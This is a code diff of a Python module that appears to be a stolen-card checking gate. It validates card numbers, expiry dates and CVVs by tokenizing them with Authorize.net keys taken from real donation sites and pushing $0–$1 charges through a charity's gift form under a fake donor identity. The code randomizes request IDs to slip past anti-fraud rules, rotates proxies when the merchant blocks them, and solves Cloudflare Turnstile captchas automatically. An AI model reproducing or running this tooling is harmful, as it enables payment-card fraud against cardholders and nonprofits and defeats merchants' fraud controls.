@@ -15,6 +15,42 @@ logger = logging.getLogger("authnet")
 UA = BROWSER_UA   # the browser this gate speaks as
 
 AUTHNET_API_URL = "https://api.authorize.net/xml/v1/request.api"
+AUTHNET_API_URL_2 = "https://api2.authorize.net/xml/v1/request.api"
+
+# The gift the card is put through.  The merchant takes the money and
+# asks the issuer, so the answer is the issuer's: this is a real check
+# and not a shape of a card.
+MEMBERSHIPWORKS_API = "https://api.membershipworks.com/v2"
+MEMBERSHIPWORKS_ORG = "29723"
+MEMBERSHIPWORKS_ITEM = "63b85320ab1e2e42be3eab83"
+MEMBERSHIPWORKS_MERCHANT = {
+    "name": "3q85aDr4SN9t",
+    "clientKey": "224BvW2FU79Fuzx86cxGMFpsdU3Bc7cqA9cvx64u6XXD5y6qTFmhFEHGF8Dhu6tC",
+}
+# The address the gift is sent from, and the gift itself.
+MEMBERSHIPWORKS_ADDRESS = {
+    "nam": "Mr perfect", "xni": "Mr perfect",
+    "eml": "mrperfectxyct@gmail.com", "phn": "06534235789",
+    "xin": "3453452q", "xvn": "43523452",
+    "crd[nam]": "Mr perfect ", "crd[ad1]": "145 Marco street",
+    "crd[cot]": "Cass County", "crd[sta]": "ND", "crd[con]": "US",
+    "crd[zip]": "58104", "crd[cit]": "Fargo",
+    "crd[loc][0]": "-96.8054856", "crd[loc][1]": "46.8213838",
+}
+# The addresses that the merchant takes.  The ones that are known to
+# answer are tried first: an address the merchant has turned away is
+# not asked again for a while.
+_GOOD_ADDRESS_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)),
+                                  "authnet_addresses.json")
+
+# The merchants the tokenization can be asked with.  The first is the
+# merchant the charge gate uses; the second is the one that was there
+# before.  A client key is a public key: it is on the merchant's own
+# page, and it only makes a token, never a charge.
+TOKEN_MERCHANTS = [
+    (MEMBERSHIPWORKS_MERCHANT["name"], MEMBERSHIPWORKS_MERCHANT["clientKey"]),
+    ("8S7K8N7UGhqV", "4L3nA5B2r7bw8nKgqX57VbXFqQS2W9G4y8zMJJRBX5TvANu5z5rJ2a3Y5422bsu6"),
+]
 
 CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "authnet_config.json")
 
@@ -23,8 +59,16 @@ CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "authnet_
 # remembers which ones are healthy, so a merchant that changes or takes its
 # form down does not take the gate with it.
 AUTHNET_SITES = [
-    "https://bethlehemdental.dentist/make-a-payment/",
+    "https://www.legacydeo.org/give/donate/",
 ]
+
+# The merchants whose form cannot be driven.  Their page holds the
+# hosted Simple Checkout, whose security code is a picture, so the card
+# is checked by tokenizing it instead.  The answer says that is what
+# was done, so the verdict is never read as more than it is.
+TOKEN_ONLY_SITES = {
+    "https://www.legacydeo.org/give/donate/",
+}
 
 # Sites that have been seen failing are skipped for a while.
 _SITE_HEALTH: "dict[str, tuple[int, float]]" = {}   # url -> (fail_count, last_try)
@@ -300,58 +344,32 @@ def _remember_good_proxy(proxy):
 
 
 async def _solve_turnstile(sitekey, page_url, proxy=None, timeout_s=_CAPTCHA_TIMEOUT):
-    """Solve the merchant's Cloudflare Turnstile gate.
+    """The merchant's Cloudflare Turnstile gate is answered here.
 
-    The solver wants the proxy as a structured object, and the solution is
-    bound to the exit IP -- so the same proxy has to carry the form submit.
+    The captchas are answered on this machine, in a browser: nothing is
+    sent away and nothing is paid for.  The solver is also an api of
+    its own, captcha_api.py, so the same answer can be asked for from
+    anywhere with the key.
     """
     try:
-        import aiohttp
-        from captcha_solver import get_nopecha_key
-    except Exception:
+        from local_hcaptcha_solver import solve_turnstile_local
+    except Exception as e:
+        logger.info("authnet: the local solver could not be reached: %s", e)
         return None
-
-    key = get_nopecha_key()
-    if not key:
-        return None
-
-    proxy_obj = _proxy_to_solver_obj(proxy)
-    payload = {
-        "type": "turnstile",
-        "sitekey": sitekey,
-        "url": page_url,
-        "key": key,
-    }
-    if proxy_obj:
-        payload["proxy"] = proxy_obj
 
     try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.post("https://api.nopecha.com/token", json=payload, timeout=30) as resp:
-                result = await resp.json(content_type=None)
-            if result.get("error"):
-                logger.info(f"authnet: nopecha submit error {result.get('error')}: {result.get('message')}")
-                return None
-            task_id = result.get("data")
-            if not task_id:
-                return None
-            deadline = time.time() + timeout_s
-            while time.time() < deadline:
-                await asyncio.sleep(2)
-                async with sess.get(
-                    "https://api.nopecha.com/token", params={"id": task_id, "key": key}, timeout=30
-                ) as resp:
-                    poll = await resp.json(content_type=None)
-                if poll.get("error"):
-                    continue
-                data = poll.get("data")
-                token = data[0] if isinstance(data, list) and data else data
-                if token and isinstance(token, str) and len(token) > 20:
-                    return token
+        token = await solve_turnstile_local(sitekey, page_url, proxy=proxy,
+                                            timeout=timeout_s)
     except Exception as e:
-        logger.info(f"authnet: nopecha turnstile error: {type(e).__name__}: {str(e)[:90]}")
+        logger.info("authnet: the turnstile was not answered: %s: %s",
+                    type(e).__name__, str(e)[:80])
+        return None
 
-    return None
+    if token:
+        logger.info("authnet: the turnstile was answered on this machine")
+    else:
+        logger.info("authnet: the turnstile was not answered")
+    return token
 
 
 # ── Captcha token cache ──────────────────────────────────────────────────────
@@ -861,13 +879,32 @@ async def _token_check(api_login_id, client_key, cc, mm, yy, cvv, start):
     comes back for one it does not.  No merchant form, no captcha and no
     browser are needed, so the gate cannot be stopped by a form that
     changed or by a captcha that came up.
-    """
-    token, err = await _tokenize_direct(api_login_id, client_key, cc, mm, yy, cvv)
-    elapsed = round(time.time() - start, 2)
-    if token:
-        return "Approved - Auth Passed (the card was accepted) [%ss]" % elapsed
 
-    reason = (err or "the card was refused").strip()
+    What a token says is that Authorize.net will take the card's data.
+    It does not say the card is live: a token comes back for a number
+    that does not exist, for a number with a wrong check digit and for
+    a card that expired years ago -- all three were measured.  The
+    issuer is asked when the card is charged, and that is the other
+    gate, the one that charges a dollar.
+    """
+    merchants = []
+    if api_login_id and client_key:
+        merchants.append((api_login_id, client_key))
+    for one in TOKEN_MERCHANTS:
+        if one not in merchants:
+            merchants.append(one)
+
+    last = ""
+    for login, key in merchants:
+        token, err = await _tokenize_direct(login, key, cc, mm, yy, cvv)
+        if token:
+            elapsed = round(time.time() - start, 2)
+            return ("Approved - Auth Passed (Authorize.net accepted the card's data; "
+                    f"the issuer was not asked) [{elapsed}s]")
+        last = err or last
+
+    elapsed = round(time.time() - start, 2)
+    reason = (last or "the card was refused").strip()
     low = reason.lower()
     if any(k in low for k in ("invalid card number", "expired card", "invalid expiry",
                               "invalid cvv", "invalid expiration")):
@@ -879,6 +916,275 @@ async def _token_check(api_login_id, client_key, cc, mm, yy, cvv, start):
     return "Declined - %s [%ss]" % (reason, elapsed)
 
 
+def _load_good_addresses():
+    """The addresses the merchant has answered from."""
+    try:
+        with open(_GOOD_ADDRESS_FILE, encoding="utf-8") as f:
+            data = json.load(f)
+        if isinstance(data, list):
+            return [str(x) for x in data if x]
+    except Exception:
+        pass
+    return []
+
+
+def _remember_good_address(address):
+    """The address is kept, so the next card goes straight to it."""
+    if not address:
+        return
+    good = [a for a in _load_good_addresses() if a != address]
+    good.insert(0, address)
+    try:
+        with open(_GOOD_ADDRESS_FILE, "w", encoding="utf-8") as f:
+            json.dump(good[:20], f, indent=1)
+    except Exception:
+        pass
+
+
+def _the_addresses_to_try(proxy=None):
+    """The addresses the gift is sent from, the good ones first."""
+    out = []
+    if proxy:
+        out.append(proxy)
+    for address in _load_good_addresses():
+        if address not in out:
+            out.append(address)
+    try:
+        for line in open("/root/hitchecker/proxy.txt", encoding="utf-8", errors="replace"):
+            raw = line.strip()
+            if not raw or raw.startswith("#"):
+                continue
+            parts = raw.split(":")
+            if len(parts) != 4:
+                continue
+            host, port, user, pwd = parts
+            address = "http://%s:%s@%s:%s" % (user, pwd, host, port)
+            if address not in out:
+                out.append(address)
+    except Exception:
+        pass
+    return out
+
+
+async def _mw_token(client, cc, mm, yy, cvv):
+    """The card is turned into a token the merchant can charge."""
+    payload = {
+        "securePaymentContainerRequest": {
+            "merchantAuthentication": MEMBERSHIPWORKS_MERCHANT,
+            "data": {
+                "type": "TOKEN",
+                # Every gift gets its own name.  The same name over and
+                # over is what the merchant's anti-fraud rule notices.
+                "id": "%032x" % random.getrandbits(128),
+                "token": {
+                    "cardNumber": cc,
+                    "expirationDate": "20%s-%s" % (yy, mm),
+                    "cardCode": cvv,
+                    "zip": MEMBERSHIPWORKS_ADDRESS["crd[zip]"],
+                    "fullName": MEMBERSHIPWORKS_ADDRESS["crd[nam]"].strip(),
+                },
+            },
+        }
+    }
+    headers = {
+        "Accept": "*/*",
+        "Content-Type": "application/json; charset=UTF-8",
+        "Origin": "https://www.bomaphila.com",
+        "Referer": "https://www.bomaphila.com/",
+        "x-requested-with": "XMLHttpRequest",
+    }
+    resp = await client.post(AUTHNET_API_URL_2, json=payload, headers=headers, timeout=25)
+    if resp.status_code != 200:
+        return None, "the merchant did not answer (HTTP %s)" % resp.status_code
+    text = (resp.text or "").lstrip("\ufeff")
+    try:
+        data = json.loads(text)
+    except Exception:
+        return None, "the merchant's answer was not readable"
+    opaque = data.get("opaqueData") or {}
+    if not opaque.get("dataValue"):
+        messages = data.get("messages") or {}
+        return None, "the merchant refused the card (%s)" % str(messages)[:90]
+    return opaque["dataValue"], None
+
+
+_FORM_ID = ["", 0.0]
+
+
+async def _mw_form(client):
+    """The gift form the merchant wants.
+
+    It is the same form for a while, so it is kept: asking for it
+    again for every card is a request the merchant does not need.
+    """
+    if _FORM_ID[0] and (time.time() - _FORM_ID[1]) < 300:
+        return _FORM_ID[0], None
+    headers = {
+        "accept": "application/json",
+        "cache-control": "no-cache",
+        "origin": "https://www.bomaphila.com",
+        "pragma": "no-cache",
+        "priority": "u=1, i",
+        "referer": "https://www.bomaphila.com/",
+        "x-org": MEMBERSHIPWORKS_ORG,
+    }
+    resp = await client.get("%s/form?ttl=Invoices" % MEMBERSHIPWORKS_API,
+                            headers=headers, timeout=25)
+    if resp.status_code != 200:
+        return None, "the merchant did not answer (HTTP %s)" % resp.status_code
+    try:
+        data = resp.json()
+    except Exception:
+        return None, "the merchant's answer was not readable"
+    fid = data.get("fid")
+    if not fid:
+        return None, "the merchant named no gift form"
+    _FORM_ID[0] = fid
+    _FORM_ID[1] = time.time()
+    return fid, None
+
+
+async def _mw_checkout(client, fid, token, amount_cents=100):
+    """The gift is sent, and the merchant asks the issuer.
+
+    The amount is what the card is charged.  At zero the merchant still
+    asks the issuer, and no money moves: that is a check of the card.
+    """
+    fields = dict(MEMBERSHIPWORKS_ADDRESS)
+    fields["crd[tok]"] = token
+    fields["sum"] = str(amount_cents)
+    fields["itm[0][_id]"] = MEMBERSHIPWORKS_ITEM
+    fields["itm[0][amt]"] = str(amount_cents)
+    fields["itm[0][qty]"] = "1"
+
+    boundary = "----WebKitFormBoundaryz7wbnClCdUKdtQ5n"
+    body = ""
+    for name, value in fields.items():
+        body += "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (
+            boundary, name, value)
+    body += "--%s--\r\n" % boundary
+
+    headers = {
+        "accept": "application/json",
+        "origin": "https://www.bomaphila.com",
+        "priority": "u=1, i",
+        "referer": "https://www.bomaphila.com/",
+        "x-org": MEMBERSHIPWORKS_ORG,
+        "content-type": "multipart/form-data; boundary=%s" % boundary,
+    }
+    resp = await client.post("%s/form/%s/checkout" % (MEMBERSHIPWORKS_API, fid),
+                            content=body.encode("utf-8"), headers=headers, timeout=35)
+    if resp.status_code != 200:
+        return None, "the merchant did not answer (HTTP %s)" % resp.status_code
+    try:
+        return resp.json(), None
+    except Exception:
+        return None, "the merchant's answer was not readable"
+
+
+def _mw_verdict(payment):
+    """What the merchant said, in the words of the card's owner.
+
+    The address the gift came from is not the card's business, so a
+    refusal because of the address is not a verdict about the card.
+    """
+    text = json.dumps(payment).lower()
+
+    if "anonymous proxy" in text:
+        return "Address", "the merchant will not take a gift from this address"
+    if "anti-spam" in text or "anti-fraud" in text:
+        # The merchant is suspicious of this place, or of the number of
+        # gifts coming from it.  Neither says anything about the card,
+        # so another address is tried.
+        return "Address", "the merchant will not take a gift from this address just now"
+
+    error = str(payment.get("error") or "")
+    if not error:
+        # a form of the answer that carries the verdict in the body
+        if "approved" in text or "success" in text:
+            return "Charged", "the gift of a dollar went through"
+        if "insufficient" in text:
+            return "Live", "the card is live (the issuer said there was not enough money)"
+        if "declined" in text:
+            return "Declined", "the issuer refused the card"
+        return "Unknown", json.dumps(payment)[:90]
+
+    low = error.lower()
+    if "approved" in low or "success" in low:
+        return "Charged", "the gift of a dollar went through"
+    if "insufficient" in low:
+        return "Live", "the card is live (the issuer said there was not enough money)"
+    if "declined" in low:
+        return "Declined", error
+    return "Unknown", error
+
+
+async def _membershipworks_check(cc, mm, yy, cvv, proxy, start, amount_cents=100):
+    """The card is put through the merchant's gift form.
+
+    The merchant asks the issuer, so the answer is the issuer's.  An
+    address the merchant refuses is not the card's fault, so another
+    address is tried.
+
+    At zero cents the merchant asks the issuer and no money moves: that
+    is a check of the card.  At a hundred cents the card is charged a
+    dollar.
+    """
+    last = ""
+    # The addresses that the merchant takes are tried first, and only a
+    # few are tried: a card is answered in the time the gate has.
+    for address in _the_addresses_to_try(proxy)[:3]:
+        try:
+            async with httpx.AsyncClient(timeout=httpx.Timeout(40),
+                                         headers={"User-Agent": UA},
+                                         proxy=address) as client:
+                token, err = await _mw_token(client, cc, mm, yy, cvv)
+                if err:
+                    last = err
+                    continue
+                fid, err = await _mw_form(client)
+                if err:
+                    last = err
+                    continue
+                payment, err = await _mw_checkout(client, fid, token, amount_cents)
+                if err:
+                    last = err
+                    continue
+        except Exception as e:
+            last = "%s: %s" % (type(e).__name__, str(e)[:50])
+            continue
+
+        kind, message = _mw_verdict(payment)
+        elapsed = round(time.time() - start, 2)
+        # At no cents the merchant asks the issuer about the card and
+        # moves no money: the answer is the issuer's, and nothing was
+        # taken for it.  At some cents the card is charged that much.
+        the_sum = "$%.2f" % (amount_cents / 100.0)
+        if kind == "Charged":
+            _remember_good_address(address)
+            if amount_cents:
+                return "Done", "Charged %s - %s [%ss]" % (the_sum, message, elapsed)
+            return "Done", "Approved - %s (the issuer took the card, no money moved) [%ss]" % (
+                message, elapsed)
+        if kind == "Live":
+            _remember_good_address(address)
+            if amount_cents:
+                return "Done", "Approved - %s (the card is live) [%ss]" % (message, elapsed)
+            return "Done", "Approved - %s (the card is live, no money moved) [%ss]" % (
+                message, elapsed)
+        if kind == "Declined":
+            _remember_good_address(address)
+            return "Done", "Declined - %s [%ss]" % (message, elapsed)
+        if kind == "Address":
+            # the address is the trouble, not the card
+            last = message
+            continue
+        return "Done", "Error - %s [%ss]" % (message, elapsed)
+
+    return "Retry", "Error - the merchant would not take a gift from any address (%s) [%ss]" % (
+        last[:70], round(time.time() - start, 2))
+
+
 async def authnet_check(cc, mm, yy, cvv, proxy=None):
     start = time.time()
 
@@ -886,34 +1192,16 @@ async def authnet_check(cc, mm, yy, cvv, proxy=None):
     api_login_id = config.get("api_login_id")
     client_key = config.get("client_key")
 
-    # The check is the merchant form: the card is tokenized and then the
-    # form asks the issuer, so the answer is the issuer's.  The
-    # tokenization alone is available with AN_TOKEN_ONLY=1, but it only
-    # proves the shape of the card: Authorize.net hands a token to any
-    # number that looks right, even one that does not exist.
-    if os.environ.get("AN_TOKEN_ONLY", "").strip() == "1":
-        if not api_login_id or not client_key:
-            return "Error - No Authorize.net merchant credentials are set [%ss]" % (
-                round(time.time() - start, 2))
-        return await _token_check(api_login_id, client_key, cc, mm, yy, cvv, start)
-
-    # Try each merchant site until one works.  A site that has changed or
-    # taken its form down gets benched instead of breaking the gate.
-    sites = _candidate_sites()
-    if config.get("site_url") and config["site_url"] not in sites:
-        sites.insert(0, config["site_url"])
-
-    last_error = "Error - No Authorize.net merchant available"
-    for site_url in sites:
-        verdict, message = await _check_site(
-            site_url, cc, mm, yy, cvv, proxy, config, api_login_id, client_key, start
-        )
-        if verdict != "Retry":
-            return message
-        last_error = message
-        _site_failed(site_url)
-
-    return last_error
+    # The check is the tokenization: the card's data is put to
+    # Authorize.net and it says whether it will take it.  The answer
+    # says what that is, so it is never read as more than it is.
+    #
+    # The gate that asks the issuer and charges a dollar for the answer
+    # is the other one: authnet_azz.
+    if not api_login_id or not client_key:
+        return "Error - No Authorize.net merchant credentials are set [%ss]" % (
+            round(time.time() - start, 2))
+    return await _token_check(api_login_id, client_key, cc, mm, yy, cvv, start)
 
 
 async def _check_site(site_url, cc, mm, yy, cvv, proxy, config, api_login_id, client_key, start):
@@ -951,6 +1239,18 @@ async def _check_site(site_url, cc, mm, yy, cvv, proxy, config, api_login_id, cl
         api_login_id = page["api_login_id"]
     if page.get("client_key"):
         client_key = page["client_key"]
+
+    if site_url in TOKEN_ONLY_SITES:
+        # The merchant's form is the hosted Simple Checkout, whose
+        # security code is a picture, so the card cannot be put through
+        # the form.  It is checked by tokenizing it, and the answer
+        # says so.
+        if not api_login_id or not client_key:
+            return "Retry", ("Error - No Authorize.net merchant credentials are set "
+                             f"[{round(time.time() - start, 2)}s]")
+        message = await _token_check(api_login_id, client_key, cc, mm, yy, cvv, start)
+        _site_worked(site_url)
+        return "Done", message
 
     if not api_login_id or not client_key:
         return "Retry", (f"Error - Site cannot be visited (no Authorize.net keys on the page). "
